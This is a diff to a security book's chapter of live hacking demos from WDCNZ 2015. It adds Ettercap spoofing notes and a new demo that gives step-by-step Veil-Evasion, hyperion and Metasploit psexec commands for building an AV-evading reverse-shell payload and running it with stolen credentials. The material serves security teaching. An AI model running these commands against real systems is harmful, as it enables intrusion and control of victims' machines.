@@ -110,7 +110,8 @@ I> The average victim will see a valid URL and the spoof will be undetectable.
 I> Use a website that you know victim is likely to spend some time at. This can make it easier if you're running exploits manually in BeEF.  
 I> Can be used to obtain credentials or simply hook with BeEF and run any number of exploits.  
 I> SET would be run on the website you want to clone. As SET only gets the index file, you'll have to use the likes of `wget` to get any other missing resources you need to complete the website. Static sites are obviously the easiest. We don't really want to have to create a back-end for the cloned website. You may have to update some of the link's to external resources as well in the index.html file that SET creates.  
-I> Ideally you'll have cleaned out the public web directory that apache hosts from `/var/www/`. If you don't, I think SET archives everything in there.
+I> Ideally you'll have cleaned out the public web directory that apache hosts from `/var/www/`. If you don't, I think SET archives everything in there.  
+I> You can also leverage ARP and DNS spoofing with Ettercap.
 
 {icon=bomb}
 G> ## The Play
@@ -168,14 +169,15 @@ T> Within the same config.yaml file `host` seems to serve two purposes. The addr
 {#wdcnz-demo-4}
 ![](images/HandsOnHack.png)
 
-The following attack was the fourth one of five that I demonstrated at WDCNZ in 2015. The [previous demo](#wdcnz-demo-3) will provide some additional context and it's probably best to look at it first if you haven't already.
+The following attack was the fourth of five that I demonstrated at WDCNZ in 2015. The [previous demo](#wdcnz-demo-3) will provide some additional context and it's probably best to look at it first if you haven't already.
 
-You can find the video of how it is played out [here](https://www.youtube.com/watch?v=tb4o5UCHzSA).
+You can find the video of how it is played out [here](https://www.youtube.com/watch?v=WSwqNb_94No).
 
 I> ## Synopsis
 I>
 I> This demo differs from the previous in that the target will be presented with a Java "needs to be updated" pop-up. When the target plays along and executes what they think is an update, they are in fact starting a reverse shell to the attacker.  
-I> The website you choose to clone doesn't have to be one that the attacker spends much time on. All that's needed is for the attacker to have done their reconnaissance and know which web sites the target frequently visits. Clone one of them. Then wait for the target to fetch it. Then succumb to the attackers bait by clicking the "Update" or "Run this time" button.
+I> The website you choose to clone doesn't have to be one that the attacker spends much time on. All that's needed is for the attacker to have done their reconnaissance and know which web sites the target frequently visits. Clone one of them. Then wait for the target to fetch it. Then succumb to the attackers bait by clicking the "Update" or "Run this time" button.  
+I> You can also leverage ARP and DNS spoofing with Ettercap from the previous attack. I haven't included these steps in this play though, although the video assume they have been included.
 
 {icon=bomb}
 G> ## The Play
@@ -224,7 +226,7 @@ G> Oh… we have a Java update.
 G> Now we know we’re always supposed to keep our systems patched right?  
 G> Better update.
 G>
-G> AV says we’re all safe. Must be all good.  
+G> Anti-virus (AV) says we’re all safe. Must be all good.  
 G> A PowerShell exploit fails.  
 G>
 G> Here come the shells.  
@@ -242,8 +244,78 @@ G> and priv is in the list.
 G> Now that we know we have [priv](https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/), we can:
 G>
 G> `run bypassuac`  
-G> Now that's successful, but anti-virus detects bad signatures on some of the root-kits. On this shell I only got the privileges of the target running the browser exploit.
+G> Now that's successful, but AV detects bad signatures on some of the root-kits. On this shell I only got the privileges of the target running the browser exploit.
 
+{#wdcnz-demo-5}
+![](images/HandsOnHack.png)
+
+The following attack was the last of five that I demonstrated at WDCNZ in 2015. The [previous demo](#wdcnz-demo-4) will provide some additional context and it's probably best to look at it first if you haven't already.
+
+You can find the video of how it is played out [here](https://www.youtube.com/watch?v=1EvwwYiMrV4).
+
+I> ## Synopsis
+I>
+I> This demo differs from the previous in that we don't rely on any of the targets direct interaction. There is no longer a need for the browser.  
+I> We open a reverse shell from the victim to us using Metasploit.  
+I> We use Veil-Evasion with the help of hyperion to encrypt our payload to evade AV.  
+I> With this attack you will have had to have obtained the targets username and password or password hash.  
+I> We leverage psexec which expects your binary to be a windows service.
+I> You can also leverage ARP and DNS spoofing with Ettercap from the previous attack. I haven't included these steps in this play though, although the video assumes they have been included.
+
+{icon=bomb}
+G> ## The Play
+G>
+G> Start Veil-Evasion:  
+G> `cd /opt/Veil/Veil-Evasion/ && ./Veil-Evasion.py`
+G>
+G> List the available payloads to encrypt:  
+G> `list`
+G>
+G> Choose a service because we are going to use psexec to install it on the targets box and we want to open a reverse shell:  
+G> `use 4`  
+G> That's `c/meterpreter/rev_http_service`
+G>
+G> Set any options here:  
+G> `set lhost <IP address that we're going to be listening on for the reverse shell>`  
+G>
+G> Generate the initial payload:  
+G> `generate`
+G>
+G> Give it a name. I just selected the default of "payload"  
+G> [Enter]  
+G> Exit out of Veil-Evasion
+G>
+G> `/usr/share/veil-output/compiled/payload[n].exe` needs to be encrypted with hyperion, either on a Windows box or Linux with Wine.  
+G> hyperion encrypts with a weak 128-bit AES key, which decrypts itself by brute force at the time of execution.  
+G> The command to run is:  
+G> `hyperion.exe -v payload.exe encrypted-payload.exe`  
+G> We then put the encrypted payload somewhere where Metasploit can access it:  
+G> I just copied it back to `/usr/share/veil-output/compiled/encrypted-payload.exe`  
+G> We then tell Metasploit where we've put it.  
+G> I created a Metasploit resource file:  
+G> `cat ~/demo.rc`
+G>
+G> `use exploit/windows/smb/psexec`  
+G> `set payload windows/meterpreter/reverse_http`  
+G> `set lport 8080`  
+G> `set lhost <IP address that we're going to be listening on for the reverse shell>`  
+G> `set rhost <IP address of target>`  
+G> `set exe::custom /usr/share/veil-output/compiled/encrypted-payload.exe`  
+G> `set smbuser <target username>`  
+G> `set smbpass <target password>`  
+G> `run`  
+G> The IP addresses and ports need to be the same as you specified in the creating of the payload using Veil-Evasion.  
+G> Now we’ve got the credentials from a previous exploit. There are many techniques and tools to help capture these, whether you have physical access or not. We just need the username & password or hash which is transmitted across the network for all to see. Also easily obtainable if you have physical access to the machine.
+G>
+G> We now run msfconsole with the resource file as parameter:  
+G> `msfconsole -r ~/demo.rc`  
+G> and that's enough to evade AV and get our reverse shell.
+G>
+G> `sessions` will show you the active sessions you have.  
+G> To interact with the first one:  
+G> `sessions -i 1`
+G>
+G> From here on in, the [video](https://www.youtube.com/watch?v=1EvwwYiMrV4) demonstrates creating a new file beside the targets hosts file, thus demonstrating full system privileges.
 
 
 
